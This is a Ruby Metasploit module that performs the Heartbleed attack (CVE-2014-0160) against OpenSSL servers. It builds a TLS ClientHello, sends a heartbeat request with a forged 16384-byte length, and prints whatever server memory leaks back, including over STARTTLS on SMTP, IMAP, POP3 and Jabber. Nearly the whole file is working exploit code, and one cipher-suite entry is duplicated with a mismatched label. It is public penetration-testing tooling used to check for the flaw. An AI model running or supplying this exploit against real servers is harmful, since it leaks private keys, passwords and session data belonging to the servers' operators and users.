# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  CIPHER_SUITES = [
    0xc014, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
    0xc00a, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
    0xc022, # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
    0xc021, # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
    0x0039, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
    0x0038, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
    0x0088, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
    0xc00f, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
    0x0035, # TLS_RSA_WITH_AES_256_CBC_SHA
    0x0084, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
    0xc012, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
    0xc008, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
    0xc01c, # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
    0xc01b, # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
    0x0016, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
    0x0013, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
    0xc00d, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
    0xc003, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
    0x000a, # TLS_RSA_WITH_3DES_EDE_CBC_SHA
    0xc013, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
    0xc009, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
    0xc01f, # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
    0xc01e, # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
    0x0033, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    0x0032, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
    0x009a, # TLS_DHE_RSA_WITH_SEED_CBC_SHA
    0x0099, # TLS_DHE_DSS_WITH_SEED_CBC_SHA
    0x0045, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
    0x0044, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
    0xc00e, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
    0xc004, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
    0x002f, # TLS_RSA_WITH_AES_128_CBC_SHA
    0x0096, # TLS_RSA_WITH_SEED_CBC_SHA
    0x0041, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
    0xc011, # TLS_ECDHE_RSA_WITH_RC4_128_SHA
    0xc007, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
    0xc00c, # TLS_ECDH_RSA_WITH_RC4_128_SHA
    0xc002, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
    0x0005, # TLS_RSA_WITH_RC4_128_SHA
    0x0004, # TLS_RSA_WITH_RC4_128_MD5
    0x0015, # TLS_DHE_RSA_WITH_DES_CBC_SHA
    0x0012, # TLS_DHE_DSS_WITH_DES_CBC_SHA
    0x0009, # TLS_RSA_WITH_DES_CBC_SHA
    0x0014, # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0011, # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
    0x0008, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0006, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
    0x0003, # TLS_RSA_EXPORT_WITH_RC4_40_MD5
    0x00ff  # Unknown
  ]

  HANDSHAKE_RECORD_TYPE = 0x16
  HEARTBEAT_RECORD_TYPE = 0x18
  ALERT_RECORD_TYPE     = 0x15
  TLS_VERSION = {
    &#039;1.0&#039; => 0x0301,
    &#039;1.1&#039; => 0x0302,
    &#039;1.2&#039; => 0x0303
  }

  TTLS_CALLBACKS = {
    &#039;SMTP&#039;   => :tls_smtp,
    &#039;IMAP&#039;   => :tls_imap,
    &#039;JABBER&#039; => :tls_jabber,
    &#039;POP3&#039;   => :tls_pop3
  }

  def initialize
    super(
      &#039;Name&#039;           => &#039;OpenSSL Heartbeat (Heartbleed) Information Leak&#039;,
      &#039;Description&#039;    => %q{
        This module implements the OpenSSL Heartbleed attack. The problem
        exists in the handling of heartbeat requests, where a fake length can
        be used to leak memory data in the response. Services that support
        STARTTLS may also be vulnerable.
      },
      &#039;Author&#039;         => [
        &#039;Neel Mehta&#039;, # Vulnerability discovery
        &#039;Riku&#039;, # Vulnerability discovery
        &#039;Antti&#039;, # Vulnerability discovery
        &#039;Matti&#039;, # Vulnerability discovery
        &#039;Jared Stafford <jspenguin[at]jspenguin.org>&#039;, # Original Proof of Concept. This module is based on it.
        &#039;FiloSottile&#039;, # PoC site and tool
        &#039;Christian Mehlmauer&#039;, # Msf module
        &#039;wvu&#039;, # Msf module
        &#039;juan vazquez&#039; # Msf module
      ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-0160&#039;],
          [&#039;US-CERT-VU&#039;, &#039;720951&#039;],
          [&#039;URL&#039;, &#039;https://www.us-cert.gov/ncas/alerts/TA14-098A&#039;],
          [&#039;URL&#039;, &#039;http://heartbleed.com/&#039;],
          [&#039;URL&#039;, &#039;https://github.com/FiloSottile/Heartbleed&#039;],
          [&#039;URL&#039;, &#039;https://gist.github.com/takeshixx/10107280&#039;],
          [&#039;URL&#039;, &#039;http://filippo.io/Heartbleed/&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 7 2014&#039;,
      &#039;License&#039;        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(443),
        OptEnum.new(&#039;STARTTLS&#039;, [true, &#039;Protocol to use with STARTTLS, None to avoid STARTTLS &#039;, &#039;None&#039;, [ &#039;None&#039;, &#039;SMTP&#039;, &#039;IMAP&#039;, &#039;JABBER&#039;, &#039;POP3&#039; ]]),
        OptEnum.new(&#039;TLSVERSION&#039;, [true, &#039;TLS version to use&#039;, &#039;1.0&#039;, [&#039;1.0&#039;, &#039;1.1&#039;, &#039;1.2&#039;]])
      ], self.class)

    register_advanced_options(
      [
        OptString.new(&#039;XMPPDOMAIN&#039;, [ true, &#039;The XMPP Domain to use when Jabber is selected&#039;, &#039;localhost&#039; ])
      ], self.class)

  end

  def peer
    "#{rhost}:#{rport}"
  end

  def tls_smtp
    # https://tools.ietf.org/html/rfc3207
    sock.get_once
    sock.put("EHLO #{Rex::Text.rand_text_alpha(10)}\n")
    res = sock.get_once

    unless res && res =~ /STARTTLS/
      return nil
    end
    sock.put("STARTTLS\n")
    sock.get_once
  end

  def tls_imap
    # http://tools.ietf.org/html/rfc2595
    sock.get_once
    sock.put("a001 CAPABILITY\r\n")
    res = sock.get_once
    unless res && res =~ /STARTTLS/i
      return nil
    end
    sock.put("a002 STARTTLS\r\n")
    sock.get_once
  end

  def tls_pop3
    # http://tools.ietf.org/html/rfc2595
    sock.get_once
    sock.put("CAPA\r\n")
    res = sock.get_once
    if res.nil? || res =~ /^-/ || res !~ /STLS/
      return nil
    end
    sock.put("STLS\r\n")
    res = sock.get_once
    if res.nil? || res =~ /^-/
      return nil
    end
    res
  end

  def tls_jabber
    # http://xmpp.org/extensions/xep-0035.html
    msg = "<?xml version=&#039;1.0&#039; ?>"
    msg << "<stream:stream xmlns=&#039;jabber:client&#039; "
    msg << "xmlns:stream=&#039;http://etherx.jabber.org/streams&#039; "
    msg << "version=&#039;1.0&#039; "
    msg << "to=&#039;#{datastore[&#039;XMPPDOMAIN&#039;]}&#039;>"
    sock.put(msg)
    res = sock.get
    if res.nil? || res =~ /stream:error/ || res !~ /starttls/i
      print_error("#{peer} - Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res =~ /<host-unknown/
      return nil
    end
    msg = "<starttls xmlns=&#039;urn:ietf:params:xml:ns:xmpp-tls&#039;/>"
    sock.put(msg)
    sock.get_once
  end

  def run_host(ip)
    connect

    unless datastore[&#039;STARTTLS&#039;] == &#039;None&#039;
      vprint_status("#{peer} - Trying to start SSL via #{datastore[&#039;STARTTLS&#039;]}")
      res = self.send(TTLS_CALLBACKS[datastore[&#039;STARTTLS&#039;]])
      if res.nil?
        vprint_error("#{peer} - STARTTLS failed...")
        return
      end
    end

    vprint_status("#{peer} - Sending Client Hello...")
    sock.put(client_hello)

    server_hello = sock.get
    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
      vprint_error("#{peer} - Server Hello Not Found")
      return
    end

    vprint_status("#{peer} - Sending Heartbeat...")
    heartbeat_length = 16384
    sock.put(heartbeat(heartbeat_length))
    hdr = sock.get_once(5)
    if hdr.blank?
      vprint_error("#{peer} - No Heartbeat response...")
      return
    end

    unpacked = hdr.unpack(&#039;Cnn&#039;)
    type = unpacked[0]
    version = unpacked[1] # must match the type from client_hello
    len = unpacked[2]

    # try to get the TLS error
    if type == ALERT_RECORD_TYPE
      res = sock.get_once(len)
      alert_unp = res.unpack(&#039;CC&#039;)
      alert_level = alert_unp[0]
      alert_desc = alert_unp[1]
      msg = "Unknown error"
      # http://tools.ietf.org/html/rfc5246#section-7.2
      case alert_desc
      when 0x46
        msg = "Protocol error. Looks like the chosen protocol is not supported."
      end
      print_error("#{peer} - #{msg}")
      disconnect
      return
    end

    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore[&#039;TLSVERSION&#039;]]
      vprint_error("#{peer} - Unexpected Heartbeat response")
      disconnect
      return
    end

    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
    heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
    if heartbeat_data
      print_good("#{peer} - Heartbeat response with leak")
      report_vuln({
        :host => rhost,
        :port => rport,
        :name => self.name,
        :refs => self.references,
        :info => "Module #{self.fullname} successfully leaked info"
      })
      vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, &#039;&#039;)}")
    else
      vprint_error("#{peer} - Looks like there isn&#039;t leaked information...")
    end
  end

  def heartbeat(length)
    payload = "\x01"              # Heartbeat Message Type: Request (1)
    payload << [length].pack("n") # Payload Length: 16384

    ssl_record(HEARTBEAT_RECORD_TYPE, payload)
  end

  def client_hello
    # Use current day for TLS time
    time_temp = Time.now
    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i

    hello_data = [TLS_VERSION[datastore[&#039;TLSVERSION&#039;]]].pack("n") # Version TLS
    hello_data << [time_epoch].pack("N")    # Time in epoch format
    hello_data << Rex::Text.rand_text(28)   # Random
    hello_data << "\x00"                    # Session ID length
    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
    hello_data << CIPHER_SUITES.pack("n*")  # Cipher Suites

    hello_data_extensions = "\x00\x0f"      # Extension type (Heartbeat)
    hello_data_extensions << "\x00\x01"     # Extension length
    hello_data_extensions << "\x01"         # Extension data

    hello_data << [hello_data_extensions.length].pack("n")
    hello_data << hello_data_extensions

    data = "\x01\x00"                      # Handshake Type: Client Hello (1)
    data << [hello_data.length].pack("n")  # Length
    data << hello_data

    ssl_record(HANDSHAKE_RECORD_TYPE, data)
  end

  def ssl_record(type, data)
    record = [type, TLS_VERSION[datastore[&#039;TLSVERSION&#039;]], data.length].pack(&#039;Cnn&#039;)
    record << data
  end
end

